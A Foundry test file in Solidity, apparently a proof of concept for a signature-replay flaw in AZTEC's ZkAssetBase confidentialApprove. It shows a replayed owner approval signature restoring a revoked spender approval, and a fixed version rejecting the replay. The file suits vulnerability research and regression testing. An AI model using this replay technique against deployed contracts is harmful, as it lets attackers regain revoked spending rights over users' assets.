// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// The real vulnerable ZkAssetBase (snapshot immediately before fix commit
// e730bde0) and the real fixed variant (with `signatureLog`) are compiled from
// ../src by the project's 0.5.11 profile and deployed here via vm.deployCode.
interface IZkAsset_16739 {
    function EIP712_DOMAIN_HASH() external view returns (bytes32);
    function confidentialApprove(bytes32, address, bool, bytes calldata) external;
    function confidentialApproved(bytes32, address) external view returns (bool);
}

// Note-registry precondition shim: a real AZTEC note is created only by a
// validated zero-knowledge proof (off-chain proving), so this reports the note
// as UNSPENT and owned by `owner`. It performs NO approval/signature logic —
// that is entirely inside the real ZkAssetBase deployed below.
contract MockACE_16739 {
    address public noteOwner;
    function createNoteRegistry(address, uint256, bool, bool) external {}
    function setNoteOwner(address owner) external { noteOwner = owner; }
    function getNote(address, bytes32) external view returns (uint8, uint40, uint40, address) {
        return (1, 0, 0, noteOwner);
    }
}

contract PoC_16739 is Test {
    uint256 private constant OWNER_KEY = 0xA11CE;
    bytes32 private constant NOTE_HASH = keccak256("aztec confidential note 16739");
    address private owner;
    address private constant SPENDER = address(0xBEEF);
    address private constant RELAYER = address(0xCAFE);

    function setUp() public { owner = vm.addr(OWNER_KEY); }

    // Produce a genuine EIP-712 NoteSignature signature by the note owner over the
    // given asset's domain and the (noteHash, spender, status) struct.
    function _sign(IZkAsset_16739 asset, bool status) internal view returns (bytes memory) {
        bytes32 typeHash = keccak256("NoteSignature(bytes32 noteHash,address spender,bool spenderApproval)");
        bytes32 structHash = keccak256(abi.encode(typeHash, NOTE_HASH, SPENDER, status));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", asset.EIP712_DOMAIN_HASH(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, digest);
        return abi.encodePacked(r, s, v);
    }

    function _deploy(string memory artifact) internal returns (IZkAsset_16739 asset, MockACE_16739 ace) {
        ace = new MockACE_16739();
        asset = IZkAsset_16739(vm.deployCode(artifact, abi.encode(address(ace), address(0), uint256(1), false)));
        ace.setNoteOwner(owner);
    }

    // HARM: the owner's revocation can be undone by replaying the owner's old,
    // already-observed approval signature — the vulnerable contract keeps no
    // record that the signature was already consumed.
    function test_vulnerable_replay_restores_revoked_approval() public {
        (IZkAsset_16739 asset,) = _deploy("ZkAssetBase.sol:ZkAssetBase");
        bytes memory approveSig = _sign(asset, true);
        bytes memory revokeSig = _sign(asset, false);

        // 1) Owner's signed approval, relayed by anyone -> spender gains permission.
        vm.prank(RELAYER);
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, approveSig);
        assertTrue(asset.confidentialApproved(NOTE_HASH, SPENDER), "grant failed");

        // 2) Owner's signed revocation -> permission withdrawn.
        vm.prank(RELAYER);
        asset.confidentialApprove(NOTE_HASH, SPENDER, false, revokeSig);
        assertFalse(asset.confidentialApproved(NOTE_HASH, SPENDER), "revoke failed");

        // 3) Replay the owner's original approval signature -> permission restored
        //    without the owner's consent. This is the vulnerability.
        vm.prank(RELAYER);
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, approveSig);
        assertTrue(asset.confidentialApproved(NOTE_HASH, SPENDER),
            "replay did not restore revoked approval");
    }

    // The real fix (signatureLog) rejects the identical replay.
    function test_fixed_rejects_replay() public {
        (IZkAsset_16739 asset,) = _deploy("ZkAssetBaseFixed.sol:ZkAssetBaseFixed");
        bytes memory approveSig = _sign(asset, true);
        bytes memory revokeSig = _sign(asset, false);

        vm.prank(RELAYER);
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, approveSig);
        assertTrue(asset.confidentialApproved(NOTE_HASH, SPENDER), "grant failed");

        vm.prank(RELAYER);
        asset.confidentialApprove(NOTE_HASH, SPENDER, false, revokeSig);
        assertFalse(asset.confidentialApproved(NOTE_HASH, SPENDER), "revoke failed");

        // Replaying the already-consumed approval signature now reverts.
        vm.prank(RELAYER);
        vm.expectRevert("signature has already been used");
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, approveSig);
        assertFalse(asset.confidentialApproved(NOTE_HASH, SPENDER),
            "fixed contract must keep the approval revoked");
    }
}
